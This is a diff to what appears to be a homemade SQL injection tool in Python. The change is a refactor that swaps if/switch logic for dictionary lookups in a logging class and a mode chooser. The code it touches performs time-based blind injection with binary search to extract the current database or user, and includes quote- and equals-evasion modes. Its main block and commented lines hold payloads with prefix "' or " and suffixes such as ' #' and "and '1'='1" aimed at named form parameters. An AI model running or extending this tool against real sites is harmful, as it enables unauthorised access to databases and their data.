@@ -152,39 +152,51 @@ class ConsoleHandler(logging.StreamHandler):
 class Mylog:
     RESULT = '\033[92m'                                                       
     INFO = '\033[94m'                                                        
-    ENDC = '\033[0m'    
+    ENDC = '\033[0m'
     def __init__(self):
         self.resultLevel = 100
         logging.addLevelName(self.resultLevel,"RESULT")
         self.logger = logging.getLogger("injectManlog")
         self.logger.setLevel(logging.INFO)
-    def toLog(self, level, message, option):
-        basicFmt = self.switchColor(level,"[%(asctime)s] [%(levelname)s] %(message)s")
+        self.colorSwitch = Switch(self.colorMap())
+        self.numSwitch = Switch(self.numMap())
+    def toLog(self, levelName, message, option):
+        basicFmt = self.colorSwitch.getValue(levelName,msg = "[%(asctime)s] [%(levelname)s] %(message)s")
         timeFmt = "%H:%M:%S"
         formatter = logging.Formatter(fmt = basicFmt,datefmt = timeFmt)
         consoleHandler = ConsoleHandler()
         consoleHandler.setFormatter(formatter)
         self.logger.addHandler(consoleHandler)
-        intLevel = self.switchIntLevel(level)
+        intLevel = self.numSwitch.getValue(levelName)
         self.logger.log(intLevel,message + self.ENDC,extra=option)
-    def switchColor(self, level, message):
-        switcher={
-            "result":self.RESULT,
-            "info":self.INFO,
+    def colorMap(self):
+        colorMap = {
+                "result":self.RESULT,
+                "info":self.INFO,       
         }
-        #pdb.set_trace()
-        return switcher.get(level) + message
-    def switchIntLevel(self,level):
-        switcher={
-            "result":100,
-            "critical":50,
-            "error":40,
-            "warning":30,
-            "info":20,
-            "debug":10,
-            "notset":0
+        return colorMap
+    def numMap(self):
+        numMap = {
+                "result":100,
+                "critical":50,
+                "error":40,
+                "warning":30,
+                "info":20,
+                "debug":10,
+                "notset":0
         }
-        return switcher.get(level)
+        return numMap
+class Switch:
+    def __init__(self, switcher):
+        self.switcher = switcher
+    def getValue(self, key, msg = None):
+        if msg:
+            toReturn = self.returnValue(key) + msg
+        else:
+            toReturn = self.returnValue(key)
+        return toReturn
+    def returnValue(self, key):
+        return self.switcher.get(key)
 class Inject:
     """
     Inject main code
@@ -195,8 +207,9 @@ class Inject:
         self.nJoin = Join(self.rFile)
         self.nRequest = Request(self.rFile)
         self.log = Mylog()
-    def inJect(self,infDict,optionDict):
-        Func = self.chooseMode(optionDict)
+        self.funcSwitch = Switch(self.funcMap())
+    def inJect(self,infDict,funcStr):
+        Func = self.funcSwitch.getValue(funcStr)
         lengthPoc = None
         length = self.binarySearch(infDict,Func,lengthPoc)
         self.log.toLog("result","Current length is {}".format(length),option={'same_line':False})
@@ -248,19 +261,17 @@ class Inject:
         elif timeTmp < stander and self.symbol == "<":
             self.symbol = ">"
         return 0
-    def chooseMode(self,infDict):
-        if '--current-db' in infDict.keys():
-            Func = "currentDb"
-        if '--current-user' in infDict.keys():
-            Func = "currentUser"
-        if '--withoutQuoteandequal' in infDict.keys():
-            Func = 'withoutQuoteandequal'
-        if '--reduceTimes' in infDict.keys():
-            Func = 'reduceTimes'
-        return Func
+    def funcMap(self):
+        funcMap = {
+            "--current-db":"currentDb",
+            "--current-user":"currentUser",
+            "--withoutQuoteandequal":"withoutQuoteandequal",
+            "--reduceTimes":"reduceTimes"
+        }
+        return funcMap
 if __name__ == "__main__":
     nInject = Inject('1.txt')
-    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},{'--current-db':True})
+    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},'--current-db')
     #nInject.inJect({'param':'roleId','prefix':'\' or ','suffix':' %23'},{'--current-db':True})
     #nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' %23'},{'--current-db':False,'--current-user':True})
     #nInject.inJect({'param':'certificateId','prefix':'\' or ','suffix':' and \'1\'=\'1'},{'--current-db':False,'--current-user':True,'--withoutQuoteandequal':False,'--reduceTimes':False})
